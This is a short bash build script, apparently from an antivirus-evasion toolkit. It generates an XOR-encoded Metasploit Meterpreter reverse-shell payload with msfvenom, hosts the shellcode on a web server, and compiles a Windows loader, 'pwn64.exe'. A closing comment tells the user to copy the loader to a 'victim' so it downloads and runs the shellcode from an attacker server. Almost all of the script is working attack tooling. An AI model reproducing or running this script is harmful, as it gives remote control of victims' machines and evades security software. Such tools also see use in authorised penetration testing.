#!/bin/bash 
. build/global_win64.sh
# example script for building executables with 64bit payload

# configure your connect-back settings here
LHOST=192.168.2.103
LPORT=443

# make meterpreter reverse payload
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x64/xor -b '\x00' -f raw --platform Windows > /var/www/html/sc.bin

# call make_avet, compile 
./make_avet -X -d sock 
$win64_compiler -o pwn64.exe avet.c  -lwsock32 -lWs2_32

# cleanup
echo "" > defs.h

# now copy pwn64.exe to victim and exec like: pwn http://yourserver/sc.bin
